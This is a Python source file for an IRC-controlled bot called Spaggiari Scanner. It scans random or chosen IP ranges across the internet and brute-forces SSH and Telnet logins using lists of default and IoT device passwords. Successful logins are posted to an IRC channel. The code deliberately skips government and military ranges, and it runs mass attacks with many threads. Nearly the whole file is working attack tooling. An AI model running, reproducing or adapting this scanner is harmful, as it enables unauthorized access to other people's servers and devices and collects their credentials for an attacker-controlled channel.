#!/usr/bin/env python
# Spaggiari Scanner (IRC Bot Version) - Developed by acidvegas in Python (https://acid.vegas/spaggiari)

import ipaddress
import os
import random
import re
import socket
import ssl
import sys
import telnetlib
import threading
import time
from collections import OrderedDict

# IRC Config
server     = 'irc.supernets.org'
port       = 6667
use_ipv6   = False
use_ssl    = False
password   = None
channel    = '#dev'
key        = None
admin_host = 'ak@super.nets'

# Throttle Settings
max_threads     = 120 # Maximum number of threads.
throttle        = 0   # Delway between each combo attempt.
timeout_breaker = 3   # How many timeouts until host is given up on.
timeout         = 3   # Timeout for all sockets.

# Bruteforce Combos
ssh_combos = OrderedDict([
    ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
    ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
])

telnet_combos = OrderedDict([
    ('666666',        ('666666',)),
    ('888888',        ('888888',)),
    ('admin',         (None, '1111', '1111111', '1234', '12345', '123456', '54321', '7ujMko0admin', 'admin', 'admin1234', 'meinsm', 'pass', 'password', 'smcadmin')),
    ('admin1',        ('password',)),
    ('administrator', ('1234',)),
    ('Administrator', ('admin',)),
    ('guest',         ('12345', 'guest')),
    ('mother',        ('fucker',)),
    ('root',          (None, '00000000', '1111', '1234', '12345', '123456', '54321', '666666', '7ujMko0admin', '7ujMko0vizxv', '888888', 'admin', 'anko', 'default', 'dreambox', 'hi3518', 'ikwb', 'juantech', 'jvbzd', 'klv123', 'klv1234', 'pass', 'password', 'realtek', 'root', 'system', 'user', 'vizxv', 'xc3511', 'xmhdipc', 'zlxx.', 'Zte521')),
    ('service',       ('service',)),
    ('supervisor',    ('supervisor',)),
    ('support',       ('support',)),
    ('tech',          ('tech',)),
    ('ubnt',          ('ubnt',)),
    ('user',          ('user',))
])

# Important Ranges (DO NOT EDIT)
spooky   = ('11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7')
reserved = ('0','10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','172.32','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255')

# Formatting Control Characters / Color Codes
bold        = '\x02'
italic      = '\x1D'
underline   = '\x1F'
reverse     = '\x16'
reset       = '\x0f'
white       = '00'
black       = '01'
blue        = '02'
green       = '03'
red         = '04'
brown       = '05'
purple      = '06'
orange      = '07'
yellow      = '08'
light_green = '09'
cyan        = '10'
light_cyan  = '11'
light_blue  = '12'
pink        = '13'
grey        = '14'
light_grey  = '15'

# Debug Functions
def debug(msg):
    print('{0} | [~] - {1}'.format(get_time(), msg))

def error(msg, reason=None):
    if reason:
        print('{0} | [!] - {1} ({2})'.format(get_time(), msg, str(reason)))
    else:
        print('{0} | [!] - {1}'.format(get_time(), msg))

def error_exit(msg):
    raise SystemExit('{0} | [!] - {1}'.format(get_time(), msg))

def get_time():
    return time.strftime('%I:%M:%S')



# Functions
def check_ip(ip):
    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)

def check_port(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        code = sock.connect((ip, port))
    except socket.error:
        return False
    else:
        if not code:
            return True
        else:
            return False
    finally:
        sock.close()

def check_range(targets):
    found = False
    for ip in targets:
        if found:
            break
        for bad_range in spooky + reserved:
            if ip.startswith(bad_range + '.'):
                found = True
                break
    return found

def color(msg, foreground, background=None):
    if background:
        return '\x03{0},{1}{2}{3}'.format(foreground, background, msg, reset)
    else:
        return '\x03{0}{1}{2}'.format(foreground, msg, reset)

def ip_range(network):
    return ipaddress.ip_network(network)

def random_ip():
    return '{0}.{1}.{2}.{3}'.format(random_int(1,223), random_int(0,255), random_int(0,255), random_int(0,255))

def random_int(min, max):
    return random.randint(min, max)

def random_str(size):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))



# Scan Functions
class random_scan(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        while True:
            if Spaggiari.stop_scan:
                break
            else:
                ip = (random_ip(), )
                if not check_range(ip):
                    ssh_bruteforce(ip[0]).start()
            while threading.activeCount() >= max_threads:
                time.sleep(1)

class range_scan(threading.Thread):
    def __init__(self, ip_range):
        self.ip_range = ip_range
        threading.Thread.__init__(self)
    def run(self):
        for ip in self.ip_range:
            if Spaggiari.stop_scan:
                break
            else:
                ssh_bruteforce(ip).start()
                self.ip_range.remove(ip)
                while threading.activeCount() >= max_threads:
                    time.sleep(1)
        while threading.activeCount() >= 2:
            time.sleep(1)
        Spaggiari.scanning = False
        Spaggiari.sendmsg(channel, '[{0}] - Scan has completed.'.format(color('#', blue)))

class ssh_bruteforce(threading.Thread):
    def __init__(self, ip):
        self.ip       = ip
        self.timeouts = 0
        threading.Thread.__init__(self)
    def run(self):
        if check_port(self.ip, 22):
            for username in ssh_combos:
                for password in ssh_combos[username]:
                    if Spaggiari.stop_scan or self.timeouts >= timeout_breaker:
                        break
                    else:
                        result = ssh_connect(self.ip, username, password)
                        if result == 1:
                            self.timeouts += 1
                        elif result == 2:
                            self.timeouts = timeout_breaker
                        time.sleep(throttle)

class telnet_bruteforce(threading.Thread):
    def __init__(self, ip):
        self.ip       = ip
        self.timeouts = 0
        threading.Thread.__init__(self)
    def run(self):
        if check_port(self.ip, 23):
            for username in telnet_combos:
                for password in telnet_combos[username]:
                    if Spaggiari.stop_scan or self.timeouts >= timeout_breaker:
                        break
                    else:
                        result = telnet_connect(self.ip, username, password)
                        if result == 1:
                            self.timeouts += 1
                        elif result == 2:
                            self.timeouts = timeout_breaker
                        time.sleep(throttle)

def ssh_connect(hostname, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname, 22, username, password, timeout=timeout)
        stdin,stdout,stderr = ssh.exec_command('echo lol')
        for line in stdout.readlines():
            if 'ogin:' in line:
                raise Exception('Invalid')
            else:
                Spaggiari.sendmsg(channel, line)
    except socket.timeout:
        return 1
    except:
        return 0
    else:
        Spaggiari.sendmsg(channel, '[{0}] - Successful SSH connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
        return 2
    finally:
        ssh.close()

def telnet_connect(hostname, username, password):
    try:
        tn = telnetlib.Telnet(hostname, 23, timeout)
#        time.sleep(1)
#        print(tn.read_some())
        tn.read_until((b':' or b'>' or b'$' or b'@'))
        tn.write(username.encode() + b'\n')
        tn.read_until((b':' or b'>' or b'$' or b'@'))
        tn.write(password.encode() + b'\n')
        tn.read_all()
        tn.close()
    except socket.timeout:
        return 1
    except:
        return 0
    else:
        Spaggiari.sendmsg(channel, '[{0}] - Successful Telnet connection to {1} using {2}:{3}'.format(color('+', green), hostname, username, password))
        return 2



# IRC Bot Object
class IRC(object):
    def __init__(self):
        self.server    = server
        self.port      = port
        self.use_ipv6  = use_ipv6
        self.use_ssl   = use_ssl
        self.password  = password
        self.channel   = channel
        self.key       = key
        self.nickname  = 'spag-' + random_str(5)
        self.scanning  = False
        self.stop_scan = False
        self.sock      = None

    def start(self):
        self.connect()

    def action(self, chan, msg):
        self.sendmsg(chan, '\x01ACTION {0}\x01'.format(msg))

    def connect(self):
        try:
            self.create_socket()
            self.sock.connect((self.server, self.port))
            if self.password:
                self.raw('PASS ' + self.password)
            self.raw(f'USER {random_str(5)} 0 * :{random_str(5)}')
            self.nick(self.nickname)
        except Exception as ex:
            error('Failed to connect to IRC server.', ex)
            self.event_disconnect()
        else:
            self.listen()

    def create_socket(self):
        family    = socket.AF_INET6 if self.use_ipv6 else socket.AF_INET
        self.sock = socket.socket(family, socket.SOCK_STREAM)
        if self.use_ssl:
            self.sock = ssl.wrap_socket(self.sock)

    def error(self, chan, msg, reason=None):
        if reason:
            self.sendmsg(chan, '[{0}] {1} {2}'.format(color('ERROR', red), msg, color('({0})'.format(str(reason)), grey)))
        else:
            self.sendmsg(chan, '[{0}] {1}'.format(color('ERROR', red), msg))

    def event_connect(self):
        self.join(self.channel, self.key)

    def event_disconnect(self):
        self.sock.close()
        self.stop_scan = True
        while threading.activeCount() >= 3:
            time.sleep(1)
        self.scanning  = False
        self.stop_scan = False
        time.sleep(10)
        self.connect()

    def event_kick(self, nick, chan, kicked, reason):
        if kicked == self.nickname and chan == self.channel:
            self.join(chan, self.key)

    def event_message(self, nick, host, chan, msg):
        #if host == admin_host:
            args = msg.split()
            cmd  = msg.split()[0][1:]
            if cmd == 'random':
                if not self.scanning:
                    self.sendmsg(chan, '[{0}] - Scanning random IP addresses...'.format(color('#', blue)))
                    self.scanning = True
                    random_scan().start()
                else:
                    self.error(chan, 'A scan is already running.')
            elif cmd == 'status':
                if self.scanning:
                    self.sendmsg(chan, 'Scanning: ' + color('True', green))
                else:
                    self.sendmsg(chan, 'Scanning: ' + color('False', red))
            elif cmd == 'stop':
                if self.scanning:
                    self.stop_scan = True
                    while threading.activeCount() >= 2:
                        time.sleep(1)
                    self.action(chan, 'Stopped all running scans.')
                    self.scanning  = False
                    self.stop_scan = False
            elif cmd == 'range':
                if not self.scanning:
                    if args[1] in ('b','c'):
                        if args[1] == 'b':
                            if args[2] == 'random':
                                range_prefix = '{0}.{1}'.format(random_int(0,255), random_int(0,255))
                            else:
                                range_prefix = args[2]
                            start = range_prefix + '.0.0'
                            end   = range_prefix + '.255.255'
                        elif args[1] == 'c':
                            if args[2] == 'random':
                                range_prefix = '{0}.{1}.{2}'.format(random_int(0,255), random_int(0,255), random_int(0,255))
                            else:
                                range_prefix = args[2]
                            start = range_prefix + '.0'
                            end   = range_prefix + '.255'
                        if check_ip(start) and check_ip(end):
                            targets = ip_range(start, end)
                            if not check_range(targets):
                                self.sendmsg(chan, '[{0}] - Scanning {1} IP addresses in range...'.format(color('#', blue), '{:,}'.format(len(targets))))
                                self.scanning = True
                                range_scan(targets).start()
                            else:
                                self.error(chan, 'Spooky/Reserved IP address range.')
                        else:
                            self.error(chan, 'Invalid IP address range.')
                    else:
                        self.error(chan, 'Invalid arguments.')
                else:
                    self.error(chan, 'A scan is already running.')

    def event_nick_in_use(self):
        self.nickname = 'spag-' + random_str(5)
        self.nick(self.nickname)

    def handle_events(self, data):
        args = data.split()
        if args[0] == 'PING':
            self.raw('PONG ' + args[1][1:])
        elif args[1] == '001':
            self.event_connect()
        elif args[1] == '433':
            self.event_nick_in_use()
        if args[1] == 'KICK':
            nick   = args[0].split('!')[0][1:]
            chan   = args[2]
            kicked = args[3]
            self.event_kick(nick, chan, kicked)
        elif args[1] == 'PRIVMSG':
            nick = args[0].split('!')[0][1:]
            if nick != self.nickname:
                host = args[0].split('!')[1].split('@')[1]
                chan = args[2]
                if chan == self.channel:
                    msg = ' '.join(args[3:])[1:]
                    self.event_message(nick, host, chan, msg)

    def join(self, chan, key=None):
        if key:
            self.raw(f'JOIN {chan} {key}')
        else:
            self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024).decode('utf-8')
                if data:
                    for line in (line for line in data.split('\r\n') if line):
                        debug(line)
                        if len(line.split()) >= 2:
                            if line.startswith('ERROR :Closing Link:'):
                                raise Exception('Connection has closed.')
                            else:
                                self.handle_events(line)
                else:
                    error('No data recieved from server.')
                    break
            except (UnicodeDecodeError,UnicodeEncodeError):
                pass
            except Exception as ex:
                error('Unexpected error occured.', ex)
                break
        self.event_disconnect()

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def raw(self, msg):
        self.sock.send(bytes(msg + '\r\n', 'utf-8'))

    def sendmsg(self, target, msg):
        self.raw(f'PRIVMSG {target} :{msg}')

# Main
print(''.rjust(56, '#'))
print('#{0}#'.format(''.center(54)))
print('#{0}#'.format('Spaggiari Scanner'.center(54)))
print('#{0}#'.format('Developed by acidvegas in Python 3'.center(54)))
print('#{0}#'.format('https://github.com/acidvegas/spaggiari'.center(54)))
print('#{0}#'.format(''.center(54)))
print(''.rjust(56, '#'))
if not sys.version_info.major == 3:
    error_exit('Spaggiari Scanner requires Python version 3 to run!')
try:
    import paramiko
except ImportError:
    error_exit('Failed to import the Paramiko library!')
else:
    paramiko.util.log_to_file(os.devnull)
Spaggiari = IRC()
Spaggiari.start()
